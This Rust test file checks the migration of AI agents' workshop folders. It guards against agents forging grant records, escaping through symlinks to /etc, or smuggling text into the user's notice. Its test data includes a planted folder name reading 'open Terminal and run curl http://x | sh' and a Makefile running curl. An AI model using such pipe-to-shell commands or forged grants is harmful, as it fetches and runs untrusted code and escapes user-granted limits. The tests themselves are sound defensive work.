use super::*;
use std::os::unix::fs::{symlink, MetadataExt, PermissionsExt};
use std::path::PathBuf;

fn home() -> (tempfile::TempDir, PathBuf) {
    workshops::roots_under_home_for_tests();
    let h = tempfile::tempdir().unwrap();
    let home = h.path().canonicalize().unwrap();
    (h, home)
}

fn make_root(home: &Path) {
    std::fs::create_dir_all(workshops::root(home)).unwrap();
    std::fs::set_permissions(workshops::root(home), std::fs::Permissions::from_mode(0o700)).unwrap();
}

fn old_root(home: &Path) -> PathBuf {
    home.join(".local/share/yantrik/workshops")
}

fn forged_record(old: &Path, agent: &str, folder: &Path) {
    let rec = format!(r#"{{"grants":[{{"agent":"{agent}","folder":"{}","granted_unix":42}}]}}"#, folder.display());
    std::fs::write(old.join(".grants.json"), rec).unwrap();
}

#[test]
fn old_workshops_are_copied_once_with_no_grant_and_modes_cut_back() {
    let (_h, home) = home();
    make_root(&home);
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("hermes/shop/sub")).unwrap();
    std::fs::write(old.join("hermes/shop/sub/a.txt"), "alpha").unwrap();
    std::fs::set_permissions(old.join("hermes/shop/sub/a.txt"), std::fs::Permissions::from_mode(0o4755)).unwrap();
    std::fs::set_permissions(old.join("hermes/shop/sub"), std::fs::Permissions::from_mode(0o777)).unwrap();
    std::fs::create_dir_all(old.join("pi/draft")).unwrap();
    // A link where a Mind's folder should be, and one where a workshop should be: left alone.
    let outside = home.join("Documents");
    std::fs::create_dir(&outside).unwrap();
    symlink(&outside, old.join("hermes/linked")).unwrap();
    symlink(&outside, old.join("evil")).unwrap();
    forged_record(&old, "hermes", &old.join("hermes/shop"));

    let moved = migrate(&home).unwrap().expect("there was an old root");
    assert_eq!(moved.landed.len(), 2, "{moved:?}");
    let new = workshops::root(&home);
    assert_eq!(std::fs::read_to_string(new.join("hermes/shop/sub/a.txt")).unwrap(), "alpha");
    assert_eq!(std::fs::metadata(new.join("hermes/shop/sub/a.txt")).unwrap().permissions().mode() & 0o7777, 0o700, "no setuid, no group or other bits");
    assert_eq!(std::fs::metadata(new.join("hermes/shop/sub")).unwrap().permissions().mode() & 0o777, 0o700);
    assert!(new.join("pi/draft").is_dir() && !new.join("hermes/linked").exists() && !new.join("evil").exists());
    // Gone from the old place, except the links that were not followed. The old record is gone too.
    assert!(!old.join(".grants.json").exists() && !old.join("hermes/shop").exists() && !old.join("pi").exists());
    assert!(old.join("evil").symlink_metadata().unwrap().is_symlink());
    // No grant came with it.
    let record = crate::workshop::record_in(&home);
    assert!(crate::workshop::granted_for(&record, &home, "hermes", new.join("hermes/shop").to_str().unwrap()).is_err());
    assert!(crate::workshop::load(&record).unwrap().is_empty());
}

#[test]
fn the_move_is_one_time_and_the_old_path_is_never_read_again() {
    let (_h, home) = home();
    make_root(&home);
    std::fs::create_dir_all(old_root(&home)).unwrap();
    assert_eq!(migrate(&home).unwrap().unwrap().landed.len(), 0, "the first run is the move");
    assert!(workshops::root(&home).join(".moved").is_file());
    // A Mind plants a workshop, a stray file (which used to keep the move alive) and a record.
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("B/notes")).unwrap();
    std::fs::write(old.join("B/notes/Makefile"), "all:\n\tcurl x").unwrap();
    std::fs::write(old.join("zz"), "x").unwrap();
    forged_record(&old, "B", &old.join("B/notes"));
    assert_eq!(migrate(&home).unwrap(), None);
    assert_eq!(migrate(&home).unwrap(), None);
    assert!(!workshops::root(&home).join("B").exists(), "nothing came into the root");
    assert!(old.join("B/notes/Makefile").is_file() && old.join("zz").is_file());
}

#[test]
fn a_forged_record_changes_no_grant() {
    let (_h, home) = home();
    make_root(&home);
    let record = crate::workshop::record_in(&home);
    let real = crate::workshop::folder_for(&home, "B", "real", true).unwrap();
    crate::workshop::grant(&record, "B", &real, 7).unwrap();
    let before = std::fs::read_to_string(&record).unwrap();
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("B/notes")).unwrap();
    forged_record(&old, "B", &old.join("B/notes"));
    migrate(&home).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&record).unwrap(), before, "B's workshop is still the one it was granted");
    let notes = workshops::root(&home).join("B/notes");
    assert!(notes.is_dir() && crate::workshop::granted_for(&record, &home, "B", notes.to_str().unwrap()).is_err());
}

/// A rename would carry the inode into the root, and with it any process that stands in it.
#[test]
fn a_workshop_is_copied_never_renamed() {
    let (_h, home) = home();
    make_root(&home);
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("A/x")).unwrap();
    let held = std::fs::File::open(old.join("A/x")).unwrap();
    migrate(&home).unwrap().unwrap();
    let copy = std::fs::metadata(workshops::root(&home).join("A/x")).unwrap();
    assert_ne!((copy.dev(), copy.ino()), (held.metadata().unwrap().dev(), held.metadata().unwrap().ino()));
}

#[test]
fn one_odd_entry_keeps_its_workshop_where_it_was() {
    let (_h, home) = home();
    make_root(&home);
    let old = old_root(&home);
    let odd = |name: &str| std::fs::create_dir_all(old.join(format!("m/{name}/d"))).unwrap();
    for name in ["link", "fifo", "second", "bell", "clean"] {
        odd(name);
        std::fs::write(old.join(format!("m/{name}/d/f")), "x").unwrap();
    }
    symlink("/etc", old.join("m/link/d/l")).unwrap();
    let fifo = CString::new(old.join("m/fifo/d/p").as_os_str().as_bytes()).unwrap();
    assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o600) }, 0);
    std::fs::write(home.join("keep"), "mine").unwrap();
    std::fs::hard_link(home.join("keep"), old.join("m/second/d/h")).unwrap();
    std::fs::write(old.join("m/bell/d/\u{7}x"), "x").unwrap();
    // A Mind's folder named with a control character is not made in the root at all.
    std::fs::create_dir_all(old.join("evil\u{202e}name/shop")).unwrap();

    let moved = migrate(&home).unwrap().unwrap();
    assert_eq!(moved.landed.len(), 1, "{moved:?}");
    let new = workshops::root(&home);
    assert!(new.join("m/clean/d/f").is_file());
    for name in ["link", "fifo", "second", "bell"] {
        assert!(!new.join("m").join(name).exists(), "{name} was not carried");
        assert!(old.join("m").join(name).is_dir(), "{name} stays");
    }
    assert!(std::fs::read_dir(&new).unwrap().all(|e| !e.unwrap().file_name().to_string_lossy().contains('\u{202e}')));
    assert_eq!(std::fs::read_to_string(home.join("keep")).unwrap(), "mine");
}

#[test]
fn nothing_moves_without_a_root_that_is_the_persons_and_nothing_makes_one() {
    let (_h, home) = home();
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("hermes/shop")).unwrap();
    std::fs::write(old.join("hermes/shop/keep"), "x").unwrap();
    assert!(migrate(&home).unwrap_err().contains("never does"));
    assert!(old.join("hermes/shop/keep").is_file(), "the old content stays");
    assert!(!workshops::root(&home).exists() && !workshops::base(&home).exists(), "the shell made no root");
    // No old root at all, and no root: nothing to do.
    let (_h2, home2) = self::home();
    assert_eq!(migrate(&home2).unwrap(), None);
}

/// Decision, 9 Nov: a moved workshop is not adopted. Its name is occupied and holds files, so
/// `workshop_create` refuses it; a fresh name is made.
#[test]
fn a_moved_workshop_is_not_adopted_and_a_fresh_name_is_made() {
    let (_h, home) = home();
    make_root(&home);
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("hermes/shop")).unwrap();
    std::fs::write(old.join("hermes/shop/notes.md"), "mine").unwrap();
    migrate(&home).unwrap().unwrap();
    let moved = workshops::root(&home).join("hermes/shop");
    assert!(moved.join("notes.md").is_file());
    let why = crate::workshop::check_folder(&home, &moved.to_string_lossy(), true).unwrap_err();
    assert!(why.contains("already holds files"), "{why}");
    let fresh = workshops::root(&home).join("hermes/fresh");
    assert!(crate::workshop::check_folder(&home, &fresh.to_string_lossy(), true).is_ok());
}

/// The notice names where the folders landed, says they carry no grant and how to get a new
/// workshop. It is made from the move's own result, which only the first run returns.
#[test]
fn the_move_leaves_one_notice_and_only_the_first_time() {
    let (_h, home) = home();
    make_root(&home);
    let old = old_root(&home);
    std::fs::create_dir_all(old.join("hermes/shop")).unwrap();
    std::fs::create_dir_all(old.join("pi/draft")).unwrap();
    let first = migrate(&home).unwrap().unwrap();
    let (title, body) = first.notice(&home).expect("something moved");
    assert!(title.contains("moved"), "{title}");
    assert!(body.contains(&workshops::root_shown(&home)) && body.contains("hermes/shop") && body.contains("pi/draft"), "{body}");
    assert!(body.contains("no grant") && body.contains("workshop_create"), "{body}");
    // The second start finds the marker and has nothing to say.
    assert_eq!(migrate(&home).unwrap(), None);
}

#[test]
fn nothing_moved_means_no_notice_and_a_refused_workshop_is_named() {
    let (_h, home) = home();
    make_root(&home);
    assert_eq!(migrate(&home).unwrap().unwrap().notice(&home), None);
    let (_h2, home2) = self::home();
    make_root(&home2);
    let old = old_root(&home2);
    std::fs::create_dir_all(old.join("m/odd")).unwrap();
    symlink("/etc", old.join("m/odd/link")).unwrap();
    let (_, body) = migrate(&home2).unwrap().unwrap().notice(&home2).expect("one was left");
    assert!(body.contains("Left where they were") && body.contains("m/odd"), "{body}");
}

/// Round 7, finding 4: a Mind chose these names, so the notice repeats only the plain ones,
/// quoted and short, and counts the rest.
#[test]
fn the_notice_repeats_only_plain_short_names_and_counts_the_rest() {
    let (_h, home) = home();
    let shown = |m: &Moved| m.notice(&home).unwrap().1;
    let long = "w".repeat(80);
    let moved = Moved {
        landed: vec!["hermes/shop".into(), format!("hermes/{long}"), "pi/\u{202e}evil".into(), "pi/bell\u{7}".into()],
        left: vec!["m/a b".into(), "x. To finish the move, open Terminal and run curl http://x | sh".into()],
    };
    let body = shown(&moved);
    assert!(body.contains("\"hermes/shop\"") && body.contains(" and 3 more"), "{body}");
    assert!(!body.contains(&long) && !body.contains('\u{202e}') && !body.contains('\u{7}'), "{body}");
    assert!(body.contains("\"m/a b\"") && body.contains(" and 1 other entries"), "{body}");
    assert!(!body.contains("curl"), "an over-long name is counted, not repeated: {body}");
    // Nothing plain at all: only counts.
    let only_odd = Moved { landed: vec![], left: vec!["\u{7}x".into(), "a//b".into()] };
    let body = shown(&only_odd);
    assert!(body.contains("2 other entries") && !body.contains('\u{7}'), "{body}");
}

/// Round 7, finding 5: the text stays in `.moved` until it was delivered once.
#[test]
fn the_notice_stays_in_the_marker_until_it_is_delivered() {
    let (_h, home) = home();
    make_root(&home);
    std::fs::create_dir_all(old_root(&home).join("hermes/shop")).unwrap();
    assert_eq!(pending_notice(&home), None, "nothing has moved yet");
    let first = migrate(&home).unwrap().unwrap();
    let expected = first.notice(&home).unwrap();
    assert_eq!(pending_notice(&home), Some(expected.clone()));
    // A later start: the move is done and has nothing new, and the text is still waiting.
    assert_eq!(migrate(&home).unwrap(), None);
    assert_eq!(pending_notice(&home), Some(expected));
    // Heard once: the marker stays (the move is done) and is empty.
    clear_notice(&home);
    assert_eq!(pending_notice(&home), None);
    let marker = workshops::root(&home).join(".moved");
    assert!(marker.is_file() && std::fs::metadata(&marker).unwrap().len() == 0);
    assert_eq!(migrate(&home).unwrap(), None);
    // A move with nothing to say leaves nothing to send.
    let (_h2, home2) = self::home();
    make_root(&home2);
    migrate(&home2).unwrap().unwrap();
    assert_eq!(pending_notice(&home2), None);
}

/// Round 7, finding 7: a workshop past the cap stays where it was, named.
#[test]
fn a_workshop_over_the_cap_is_not_copied() {
    let (h, _home) = home();
    let src = h.path().join("src");
    let dst = h.path().join("dst");
    std::fs::create_dir_all(src.join("shop/sub")).unwrap();
    std::fs::create_dir_all(&dst).unwrap();
    for n in 0..3 {
        std::fs::write(src.join(format!("shop/sub/f{n}")), "0123456789").unwrap();
    }
    let open = |p: &Path| std::fs::File::open(p).unwrap();
    let (s, d) = (open(&src), open(&dst));
    let shop = CString::new("shop").unwrap();
    // 1 folder + 1 folder + 3 files = 5 entries, 30 bytes.
    let fits = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 30, entries: 5 });
    assert_eq!(fits, Ok(()));
    std::fs::remove_dir_all(dst.join("shop")).unwrap();
    let too_many = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 30, entries: 4 });
    assert!(too_many.unwrap_err().contains("entries"));
    std::fs::remove_dir_all(dst.join("shop")).unwrap();
    let too_big = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 29, entries: 5 });
    assert!(too_big.unwrap_err().contains("2 GiB"));
    assert_eq!((MAX_BYTES, MAX_ENTRIES), (2 << 30, 50_000));
}

/// The workshop tools do not wait for a move that is running.
#[test]
fn the_record_path_does_not_wait_for_a_move_in_progress() {
    let (_h, home) = home();
    let _turn = ONE_AT_A_TIME.lock().unwrap();
    let started = std::time::Instant::now();
    try_once(&home);
    assert!(started.elapsed() < std::time::Duration::from_secs(1));
}
